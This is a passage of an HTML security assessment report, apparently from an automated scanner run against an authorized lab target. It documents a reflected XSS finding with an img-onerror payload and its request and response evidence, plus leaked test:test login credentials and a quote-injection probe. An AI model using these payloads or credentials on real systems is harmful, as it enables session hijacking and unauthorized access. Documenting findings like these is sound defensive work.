+                &lt;button id=&quot;getTotalLoanPayments&quot; class=&quot;btn btn-primary&quot;&gt;Calculate total loan payments and interests&lt;/button&gt;
+                
+                &lt;!-- Message to display total loan payment --&gt;
+                &lt;p id=&quot;loanPaymentMessage&quot;&gt;&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/loan_details&quot;&gt;Loan Details&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/logout&quot;&gt;Exit&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;!-- jQuery (you may need to include it if not already included) --&gt;
+    &lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Event listener for button click
+            $('#getTotalLoanPayments').click(function() {
+                // Extract loan amount, monthly payment and term from HTML
+                var loanAmount = 555555.0;
+                var loanTerm = 3;
+                var monthlyPayment = 42.0;
+                
+                // AJAX request to /total_loan_payments
+                $.ajax({
+                    url: '/total_loan_payments',
+                    type: 'GET',
+                    data: {
+                        principal: loanAmount,
+                        payment: monthlyPayment,
+                        term: loanTerm
+                    },
+                    success: function(data) {
+                        const obj = JSON.parse(data); 
+
+                        // Extract total loan payment from JSON data
+                        var totalLoanPayment = obj.total_loan_payments;
+                        var totalInterests = parseFloat(obj.total_loan_payments) - parseFloat(obj.loan_principal);
+                        // Update HTML content with total loan payment
+
+                        $('#loanPaymentMessage').text(&quot;Your total loan payment will be &quot; + totalLoanPayment + 
+                            &quot;, paying a total of &quot; + totalInterests + &quot; of interests&quot;
+                        );
+                    },
+                    error: function(xhr, status, error) {
+                        // Handle error
+                        console.log(&quot;Error:&quot;, error);
+                    }
+                });
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 4. [xss-reflected] Reflected XSS in loan calculator via principal parameter</h3>
+<div class="kv">Screen: <code>s-0007</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32830/login</div>
+<div class="desc">The /total_loan_payments endpoint reflects the client-supplied `principal` parameter into a response served with Content-Type text/html without HTML-encoding. An img-onerror payload survives unescaped in the response body, so a crafted GET link (or the AJAX response rendered into #loanPaymentMessage on /loan_details) executes attacker-controlled JavaScript in the victim's authenticated session. Negative control (benign marker) was escaped/inert; two positive replays reflected the active payload unescaped. Note this is the same reflected input that is also evaluated server-side as Jinja2 (see the SSTI finding on this endpoint/param) — the XSS is the client-side manifestation of the missing output encoding.</div>
+<div><b>Reproduction</b></div><pre>1. Authenticate, then request GET /total_loan_payments?principal=&lt;img src=x onerror=alert(1)&gt;&amp;payment=100&amp;term=12
+2. Response (Content-Type: text/html) reflects the img/onerror payload verbatim, unescaped.
+3. Delivered as a link to a logged-in victim, or via the /loan_details &quot;Calculate&quot; button rendering the response, the JavaScript executes. Confirmed via img-onerror bypass with negative control + 2 stable positive replays.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr312ztr-4u</code> — <code>artifacts/s-0007/ev-mr312ztr-4u/</code></div><div class="lbl">REQUEST</div><pre>GET /total_loan_payments?principal=xssbenignxZmr312z8z19th&amp;payment=100&amp;term=12 HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 152
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:52:31 GMT
+expires: 0
+keep-alive: timeout=5, max=98
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+
+        { &quot;loan_principal&quot;: &quot;xssbenignxZmr312z8z19th&quot; ,&quot;monthly_payment&quot;: &quot;100.0&quot;, &quot;loan_term_amount&quot;: &quot;12&quot;, &quot;total_loan_payments&quot;: &quot;1200.0&quot; }</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31302e-4v</code> — <code>artifacts/s-0007/ev-mr31302e-4v/</code></div><div class="lbl">REQUEST</div><pre>GET /total_loan_payments?principal=%3Cimg+src%3Dx+onerror%3Dalert%28%27xZmr312z8z19th%27%29%3E&amp;payment=100&amp;term=12 HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 172
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:52:31 GMT
+expires: 0
+keep-alive: timeout=5, max=97
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+
+        { &quot;loan_principal&quot;: &quot;&lt;img src=x onerror=alert('xZmr312z8z19th')&gt;&quot; ,&quot;monthly_payment&quot;: &quot;100.0&quot;, &quot;loan_term_amount&quot;: &quot;12&quot;, &quot;total_loan_payments&quot;: &quot;1200.0&quot; }</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr3130az-4w</code> — <code>artifacts/s-0007/ev-mr3130az-4w/</code></div><div class="lbl">REQUEST</div><pre>GET /total_loan_payments?principal=%3Cimg+src%3Dx+onerror%3Dalert%28%27xZmr312z8z19th%27%29%3E&amp;payment=100&amp;term=12 HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 172
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:52:31 GMT
+expires: 0
+keep-alive: timeout=5, max=96
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Cookie,Accept-Encoding
+
+
+        { &quot;loan_principal&quot;: &quot;&lt;img src=x onerror=alert('xZmr312z8z19th')&gt;&quot; ,&quot;monthly_payment&quot;: &quot;100.0&quot;, &quot;loan_term_amount&quot;: &quot;12&quot;, &quot;total_loan_payments&quot;: &quot;1200.0&quot; }</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 5. [info-disclosure] Working test credentials (test:test) disclosed in login page HTML comment</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32830/login</div>
+<div class="desc">Every unauthenticated GET/POST response for /login includes the HTML comment `&lt;!-- TODO: Delete the testing account (test:test). --&gt;` in the page source. This discloses that an undeleted test account exists and reveals its credentials. The credentials are valid: POST /login with username=test&amp;password=test returns 302 -&gt; /home and issues a session cookie for user_id=1 (the primary account). Any visitor who views source obtains working credentials. Impact is bounded by the credentials also being trivially guessable, but leaking them in source is a concrete information/secret disclosure and confirms an account that should have been removed.</div>
+<div><b>Reproduction</b></div><pre>1) GET or POST /login and view the HTML source -&gt; contains `&lt;!-- TODO: Delete the testing account (test:test). --&gt;`. 2) POST /login with body `username=test&amp;password=test` -&gt; HTTP 302 redirect to /home with Set-Cookie session=...{&quot;user_id&quot;:1}, confirming the leaked credentials authenticate as user_id=1.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr30aifr-23</code> — <code>artifacts/s-0001/ev-mr30aifr-23/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=verdictx'&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+cache-control: public, max-age=0
+connection: close
+content-length: 265
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:30:22 GMT
+expires: 0
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr30a259-21</code> — <code>artifacts/s-0001/ev-mr30a259-21/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=verdictx&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1900
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:30:00 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- TODO: Delete the testing account (test:test). --&gt; 
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h2 class=&quot;card-title text-center&quot;&gt;Login&lt;/h2&gt;
+                        &lt;form id=&quot;loginForm&quot; action=&quot;/login&quot; method=&quot;post&quot;&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username:&lt;/label&gt;
+                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password:&lt;/label&gt;
+                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Login&lt;/button&gt;
+                        &lt;/form&gt;
+                        
+                        &lt;!-- Display error message if login fails --&gt;
+                        &lt;div class=&quot;alert alert-danger mt-3&quot; role=&quot;alert&quot;&gt;
+                            Invalid username or password
+                        &lt;/div&gt;
+                        
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr307sa8-1z</code> — <code>artifacts/s-0001/ev-mr307sa8-1z/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32830
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=quotetestNOQUOTE&amp;password=x</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1900
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:28:14 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- TODO: Delete the testing account (test:test). --&gt; 
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h2 class=&quot;card-title text-center&quot;&gt;Login&lt;/h2&gt;
+                        &lt;form id=&quot;loginForm&quot; action=&quot;/login&quot; method=&quot;post&quot;&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username:&lt;/label&gt;
+                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password:&lt;/label&gt;
+                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Login&lt;/button&gt;
+                        &lt;/form&gt;
+                        
+                        &lt;!-- Display error message if login fails --&gt;
+                        &lt;div class=&quot;alert alert-danger mt-3&quot; role=&quot;alert&quot;&gt;
+                            Invalid username or password
+                        &lt;/div&gt;
+                        
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
